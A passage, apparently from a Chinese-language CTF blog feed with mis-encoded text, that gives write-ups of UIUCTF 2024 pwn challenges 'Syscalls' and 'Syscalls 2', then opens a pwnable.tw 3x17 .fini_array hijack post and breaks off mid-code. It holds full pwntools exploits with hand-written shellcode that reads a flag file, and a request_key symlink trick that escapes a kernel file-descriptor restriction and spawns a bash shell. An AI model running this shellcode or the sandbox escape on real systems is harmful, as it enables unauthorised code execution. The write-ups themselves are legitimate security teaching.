0)</code>ä»£è¡¨ä»¥åªè¯»æ¨¡å¼æ‰“å¼€å½“å‰å·¥ä½œç›®å½•ä¸‹çš„<code>./flag.txt</code>æ–‡ä»¶ã€‚</p></li><li><p><code>preadv2()</code>å’Œ<code>pwritev2()</code>ç”¨æ³•</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt, <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt, <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></tbody></table></figure><p>å¯¹ä¸ç†Ÿæ‚‰çš„ç³»ç»Ÿè°ƒç”¨/å‡½æ•°ä¸€èˆ¬å¯ä»¥ä»äº’è”ç½‘ä¸Šæ‰¾ä¾‹å­æ¥ç†è§£ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>          *str0 = <span class="string">"hello "</span>;</span><br><span class="line"><span class="type">char</span>          *str1 = <span class="string">"world\n"</span>;</span><br><span class="line"><span class="type">ssize_t</span>       nwritten;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>  <span class="title">iov</span>[2];</span></span><br><span class="line"></span><br><span class="line">iov[<span class="number">0</span>].iov_base = str0;</span><br><span class="line">iov[<span class="number">0</span>].iov_len = <span class="built_in">strlen</span>(str0);</span><br><span class="line">iov[<span class="number">1</span>].iov_base = str1;</span><br><span class="line">iov[<span class="number">1</span>].iov_len = <span class="built_in">strlen</span>(str1);</span><br><span class="line"></span><br><span class="line">nwritten = writev(STDOUT_FILENO, iov, <span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><p>å³<code>iov</code>æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„ä½“å‰8å­—èŠ‚ä¸ºè¦è¯»/å†™çš„åœ°å€ï¼Œå8å­—èŠ‚ä¸ºè¦è¯»/å†™çš„é•¿åº¦ï¼›<code>iovcnt</code>ç”¨æ¥è¡¨ç¤ºæ•°ç»„ä¸­å…ƒç´ æ•°é‡ã€‚</p><blockquote><p>Unlike preadv() and pwritev(), if the offset argument is -1, then the current file offset is used and updated.</p><p>The flags argument contains a bitwise OR of zero or more of the following flags â€¦</p></blockquote><p><code>offset</code>è®¾ç½®ä¸º1å…¶å®æ˜¯è®©ç³»ç»Ÿæ›¿æˆ‘ä»¬ç®¡ç†åç§»é‡ï¼Œ<code>flags</code>é€šå¸¸éƒ½æ˜¯è®¾ç½®ä¸º0å³å¯ã€‚</p></li></ol><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./syscalls_patched"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"syscalls.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># openat(AT_FDCWD, "./flag.txt", 0)</span></span><br><span class="line">    <span class="comment"># preadv2(3, {"rsp", 0x50}, 1, 0, 0)</span></span><br><span class="line">    <span class="comment"># pwritev2(1, {"rsp", 0x50}, 1, -1, 0)</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax, 257</span></span><br><span class="line"><span class="string">        mov rdi, -100</span></span><br><span class="line"><span class="string">        mov rsi, 0x7478</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rsi, 0x742e67616c662f2e</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        mov rax, 327</span></span><br><span class="line"><span class="string">        mov r12, rsp</span></span><br><span class="line"><span class="string">        add r12, 0x50</span></span><br><span class="line"><span class="string">        mov r11, 0x50</span></span><br><span class="line"><span class="string">        push r11</span></span><br><span class="line"><span class="string">        push r12</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov rdx, 1</span></span><br><span class="line"><span class="string">        mov r10, -1</span></span><br><span class="line"><span class="string">        mov r8, 0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rax, 328</span></span><br><span class="line"><span class="string">        mov rdi, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># gdb.attach(r, '''</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x12d6)'''</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    <span class="built_in">print</span>(shellcode)</span><br><span class="line">    r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘çŸ¥é“å¯ä»¥ç”¨<code>shellcraft</code>æ¥æ„é€  shellcodeï¼Œä½†æˆ‘å°±çˆ±è‡ªå·±å†™ XDã€‚</p><h2 id="Syscalls-2"><a href="#Syscalls-2" class="headerlink" title="Syscalls 2"></a>Syscalls 2</h2><h3 id="æ¦‚å†µ-4"><a href="#æ¦‚å†µ-4" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h3><blockquote><p>I made it harder ;)<br>Hint: Itâ€™s not a bug, itâ€™s a feature!</p><p>8 Solves</p></blockquote><p>exp ä¿®æ”¹è‡ª robbert1978ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é“é¢˜å¯¹å†…æ ¸åšäº†patchï¼š</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">From 1470120abb93fb80ee0ac52feab611418ec957d7 Mon Sep 17 00:00:00 2001</span><br><span class="line">From: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line">Date: Wed, 26 Jun 2024 19:39:11 -0700</span><br><span class="line">Subject: [PATCH] prctl: Add a way to prohibit file descriptor creation</span><br><span class="line"></span><br><span class="line">They are avoided by enforcing a failure when the kernel tries to</span><br><span class="line">allocate a free fd. To be extra extra safe, attempting to install</span><br><span class="line">an fd after the point of no return will panic.</span><br><span class="line"></span><br><span class="line">Child processes inherit the restriction just like seccomp.</span><br><span class="line"></span><br><span class="line">Signed-off-by: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line"> fs/file.c                  | 7 +++++++</span><br><span class="line"> include/linux/sched.h      | 5 +++++</span><br><span class="line"> include/uapi/linux/prctl.h | 2 ++</span><br><span class="line"> kernel/fork.c              | 3 +++</span><br><span class="line"> kernel/sys.c               | 3 +++</span><br><span class="line"> 5 files changed, 20 insertions(+)</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/fs/file.c b/fs/file.c</span></span><br><span class="line"><span class="comment">index 3b683b9101d8..d9562f8bca85 100644</span></span><br><span class="line"><span class="comment">--- a/fs/file.c</span></span><br><span class="line"><span class="comment">+++ b/fs/file.c</span></span><br><span class="line"><span class="meta">@@ -503,6 +503,9 @@</span> static int alloc_fd(unsigned start, unsigned end, unsigned flags)</span><br><span class="line"> int error;</span><br><span class="line"> struct fdtable *fdt;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+if (task_uiuctf_no_fds_allowed(current))</span></span><br><span class="line"><span class="addition">+return -EPERM;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line"> repeat:</span><br><span class="line"> fdt = files_fdtable(files);</span><br><span class="line"><span class="meta">@@ -604,6 +607,10 @@</span> void fd_install(unsigned int fd, struct file *file)</span><br><span class="line"> struct files_struct *files = current-&gt;files;</span><br><span class="line"> struct fdtable *fdt;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+if (task_uiuctf_no_fds_allowed(current))</span></span><br><span class="line"><span class="addition">+panic("Installing fds is actually not allowed and "</span></span><br><span class="line"><span class="addition">+      "I'm not trying to hide a bypass");</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> if (WARN_ON_ONCE(unlikely(file-&gt;f_mode &amp; FMODE_BACKING)))</span><br><span class="line"> return;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/include/linux/sched.h b/include/linux/sched.h</span></span><br><span class="line"><span class="comment">index 3c2abbc587b4..f4584022dc4c 100644</span></span><br><span class="line"><span class="comment">--- a/include/linux/sched.h</span></span><br><span class="line"><span class="comment">+++ b/include/linux/sched.h</span></span><br><span class="line"><span class="meta">@@ -1698,6 +1698,8 @@</span> static __always_inline bool is_percpu_thread(void)</span><br><span class="line"> #define PFA_SPEC_IB_FORCE_DISABLE6/* Indirect branch speculation permanently restricted */</span><br><span class="line"> #define PFA_SPEC_SSB_NOEXEC7/* Speculative Store Bypass clear on execve() */</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#define PFA_UIUCTF_NO_FDS_ALLOWED10</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #define TASK_PFA_TEST(name, func)\</span><br><span class="line"> static inline bool task_##func(struct task_struct *p)\</span><br><span class="line"> { return test_bit(PFA_##name, &amp;p-&gt;atomic_flags); }</span><br><span class="line"><span class="meta">@@ -1739,6 +1741,9 @@</span> TASK_PFA_CLEAR(SPEC_IB_DISABLE, spec_ib_disable)</span><br><span class="line"> TASK_PFA_TEST(SPEC_IB_FORCE_DISABLE, spec_ib_force_disable)</span><br><span class="line"> TASK_PFA_SET(SPEC_IB_FORCE_DISABLE, spec_ib_force_disable)</span><br><span class="line"> </span><br><span class="line"><span class="addition">+TASK_PFA_TEST(UIUCTF_NO_FDS_ALLOWED, uiuctf_no_fds_allowed)</span></span><br><span class="line"><span class="addition">+TASK_PFA_SET(UIUCTF_NO_FDS_ALLOWED, uiuctf_no_fds_allowed)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> static inline void</span><br><span class="line"> current_restore_flags(unsigned long orig_flags, unsigned long flags)</span><br><span class="line"> {</span><br><span class="line"><span class="comment">diff --git a/include/uapi/linux/prctl.h b/include/uapi/linux/prctl.h</span></span><br><span class="line"><span class="comment">index 370ed14b1ae0..6075c202ca43 100644</span></span><br><span class="line"><span class="comment">--- a/include/uapi/linux/prctl.h</span></span><br><span class="line"><span class="comment">+++ b/include/uapi/linux/prctl.h</span></span><br><span class="line"><span class="meta">@@ -306,4 +306,6 @@</span> struct prctl_mm_map {</span><br><span class="line"> # define PR_RISCV_V_VSTATE_CTRL_NEXT_MASK0xc</span><br><span class="line"> # define PR_RISCV_V_VSTATE_CTRL_MASK0x1f</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#define PRCTL_UIUCTF_NO_FDS_ALLOWED 100</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #endif /* _LINUX_PRCTL_H */</span><br><span class="line"><span class="comment">diff --git a/kernel/fork.c b/kernel/fork.c</span></span><br><span class="line"><span class="comment">index aebb3e6c96dc..692c01b13c9a 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/fork.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/fork.c</span></span><br><span class="line"><span class="meta">@@ -2559,6 +2559,9 @@</span> __latent_entropy struct task_struct *copy_process(</span><br><span class="line">  */</span><br><span class="line"> copy_seccomp(p);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+if (task_uiuctf_no_fds_allowed(current))</span></span><br><span class="line"><span class="addition">+task_set_uiuctf_no_fds_allowed(p);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> init_task_pid_links(p);</span><br><span class="line"> if (likely(p-&gt;pid)) {</span><br><span class="line"> ptrace_init_task(p, (clone_flags &amp; CLONE_PTRACE) || trace);</span><br><span class="line"><span class="comment">diff --git a/kernel/sys.c b/kernel/sys.c</span></span><br><span class="line"><span class="comment">index 8bb106a56b3a..5bb16543a565 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/sys.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/sys.c</span></span><br><span class="line"><span class="meta">@@ -2760,6 +2760,9 @@</span> SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,</span><br><span class="line"> case PR_RISCV_V_GET_CONTROL:</span><br><span class="line"> error = RISCV_V_GET_CONTROL();</span><br><span class="line"> break;</span><br><span class="line"><span class="addition">+case PRCTL_UIUCTF_NO_FDS_ALLOWED:</span></span><br><span class="line"><span class="addition">+task_set_uiuctf_no_fds_allowed(current);</span></span><br><span class="line"><span class="addition">+break;</span></span><br><span class="line"> default:</span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> break;</span><br><span class="line"><span class="deletion">-- </span></span><br><span class="line">2.45.1</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>é¢˜ç›®è‡ªå®šä¹‰äº†ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç¨‹åºè°ƒç”¨<code>prctl(PRCTL_UIUCTF_NO_FDS_ALLOWED)</code>åï¼Œä¼šé˜»æ­¢<code>alloc_fd()</code>å’Œ<code>fd_install()</code>æ­£å¸¸è¿è¡Œï¼Œå¹¶ä¸”åœ¨å¯¹<code>copy_process()</code>çš„ä¿®æ”¹ä¸­ä½¿å¾—<code>fork</code>çš„å­ç¨‹åºä¼šç»§æ‰¿è¿™ä¸€å±æ€§ã€‚å› æ­¤é¢„æœŸè§£æ˜¯ä½¿ç”¨<code>io_uring</code>æ¥è¯» flagï¼š</p><ol><li><code>io_uring</code>æœ¬èº«ä¸éœ€è¦ä¸€ä¸ªæ–°çš„ fd</li><li><code>io_uring</code>ç®¡ç†äº†è‡ªå·±çš„ fd è¡¨ï¼Œä¸ä¼šè§¦å‘<code>alloc_fd</code>å’Œ<code>fd_install</code></li></ol><h3 id="æ”»å‡»æ€è·¯-3"><a href="#æ”»å‡»æ€è·¯-3" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>ä½†æ˜¯æˆ‘æ›´å–œæ¬¢éé¢„æœŸè§£ï¼š</p><p>é¦–å…ˆéœ€è¦ç†è§£<code>request_key</code>ç³»ç»Ÿè°ƒç”¨ã€‚å‚è€ƒ<a href="https://man7.org/linux/man-pages/man2/request_key.2.html">manpage</a>ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">key_serial_t</span> <span class="title function_">request_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *_Nullable callout_info,</span></span><br><span class="line"><span class="params"><span class="type">key_serial_t</span> dest_keyring)</span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>If the kernel cannot find a key matching type and description, and callout is not NULL, then the kernel attempts to invoke a user-space program to instantiate a key with the given type and description.  In this case, the following steps are performed:<br>â€¦<br>    (3)  The kernel creates a process that executes a user-space service such as request-key(8) with a new session keyring that contains a link to the authorization key, V. This program is supplied with the following command-line arguments:</p><p>â€‹[0]  The string â€œ/sbin/request-keyâ€.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬æŒ‡å®šçš„<code>type</code>å’Œ<code>description</code>èƒ½è®©å†…æ ¸æ— æ³•æ‰¾åˆ°å¯¹åº”çš„<code>key</code>ï¼Œå®ƒå°±ä¼šè¿è¡Œ<code>/sbin/request-key</code></p><p>éé¢„æœŸè§£çš„æ€è·¯æ˜¯ï¼š</p><ol><li>å°†<code>/sbin/request_key</code>è®¾ä¸º<code>/init</code>çš„ç¬¦å·é“¾æ¥</li><li>å°†<code>/chal</code>è®¾ç½®ä¸º<code>/bin/bash</code>çš„ç¬¦å·é“¾æ¥</li><li>ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨<code>request_key</code>ï¼Œå¹¶ä¼ å…¥å†…æ ¸æ— æ³•è¯†åˆ«çš„<code>type</code>å’Œ<code>description</code></li><li><code>request_key</code>å°†è°ƒç”¨<code>/sbin/rquest-key-&gt;/init</code>ï¼Œæ–°çš„<code>/init</code>ä¸ä¼šæœ‰<code>no_fds</code>çš„è¿‡æ»¤</li><li><code>/init</code>æ‰§è¡Œ<code>exec /chal-&gt;/bin/bash</code>ï¼Œå¼¹å‡º shell</li></ol><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">shellcode = asm(<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset init]</span></span><br><span class="line"><span class="string">    lea rsi, [rip + offset request_key]</span></span><br><span class="line"><span class="string">    mov eax, 0x58</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset chal]</span></span><br><span class="line"><span class="string">    mov eax, 0x57</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset bash]</span></span><br><span class="line"><span class="string">    lea rsi, [rip + offset chal]</span></span><br><span class="line"><span class="string">    mov eax, 0x58</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset a]</span></span><br><span class="line"><span class="string">    lea rsi, [rip + offset b]</span></span><br><span class="line"><span class="string">    lea rdx, [rip + offset c]  </span></span><br><span class="line"><span class="string">    mov r10, 0xfffffffd </span></span><br><span class="line"><span class="string">    mov rax, 0xf9       </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">a:</span></span><br><span class="line"><span class="string">    .asciz "user"</span></span><br><span class="line"><span class="string">b:</span></span><br><span class="line"><span class="string">    .asciz "BeaCox:nonsense"</span></span><br><span class="line"><span class="string">c:</span></span><br><span class="line"><span class="string">    .asciz "payload:data"</span></span><br><span class="line"><span class="string">init:</span></span><br><span class="line"><span class="string">    .asciz "/init"</span></span><br><span class="line"><span class="string">chal:</span></span><br><span class="line"><span class="string">    .asciz "/chal"</span></span><br><span class="line"><span class="string">request_key:</span></span><br><span class="line"><span class="string">    .asciz "/sbin/request-key"</span></span><br><span class="line"><span class="string">bash:</span></span><br><span class="line"><span class="string">    .asciz "/bin/bash"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode.<span class="built_in">hex</span>())</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">UIUCTF 2024 PWN é¢˜å…¨é›†ï¼ˆWith L3akï¼‰ã€‚</summary>
    
    
    
    <category term="CTF" scheme="https://blog.beacox.space/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://blog.beacox.space/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ä» pwnable.twâ€”â€”3x17 å­¦ä¹  .fini_array</title>
    <link href="https://blog.beacox.space/posts/fini_array/"/>
    <id>https://blog.beacox.space/posts/fini_array/</id>
    <published>2024-06-19T14:00:00.000Z</published>
    <updated>2024-06-19T14:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>å°½ç®¡ <a href="https://pwnable.tw/challenge/">pwnable.tw</a>å·²ç»å¾ˆä¹…æ²¡æ›´æ–°æ–°é¢˜ï¼Œè¿™ä¸Šé¢çš„é¢˜ç›®æ”¾åˆ°ç°åœ¨<del>å¯¹æˆ‘è€Œè¨€</del>ä¹Ÿä»ç„¶æ˜¯å¾ˆæœ‰è¶£çš„ã€‚åœ¨è§£ 3x17 è¿™é“é¢˜çš„æ—¶å€™ï¼Œç”¨åˆ°äº†ä¹‹å‰ä»æ²¡ç”¨è¿‡çš„ <strong>fini_array hijack</strong>ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="é¢„åˆ†æ"><a href="#é¢„åˆ†æ" class="headerlink" title="é¢„åˆ†æ"></a>é¢„åˆ†æ</h2><p><code>checksec</code> ç»“æœï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></tbody></table></figure><p><code>file</code> ç»“æœï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped</span><br></pre></td></tr></tbody></table></figure><ul><li>PIE æœªå¯ç”¨ï¼šä¸ç”¨æ³„éœ²ç¨‹åºåŸºåœ°å€</li><li>canary æœªå¯ç”¨ï¼šå¦‚æœæœ‰æ ˆæº¢å‡ºå¯ä»¥ç›´æ¥åˆ©ç”¨</li><li>é™æ€é“¾æ¥ï¼šæ²¡æœ‰ libc</li></ul><h2 id="ç¨‹åºåŠŸèƒ½åˆ†æ"><a href="#ç¨‹åºåŠŸèƒ½åˆ†æ" class="headerlink" title="ç¨‹åºåŠŸèƒ½åˆ†æ"></a>ç¨‹åºåŠŸèƒ½åˆ†æ</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">{</span><br><span class="line">  write_func(<span class="number">1u</span>, <span class="string">"addr:"</span>, <span class="number">5uLL</span>);</span><br><span class="line">  read_func(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  v4 = (<span class="type">char</span> *)(<span class="type">int</span>)bytes_to_addr(buf);</span><br><span class="line">  write_func(<span class="number">1u</span>, <span 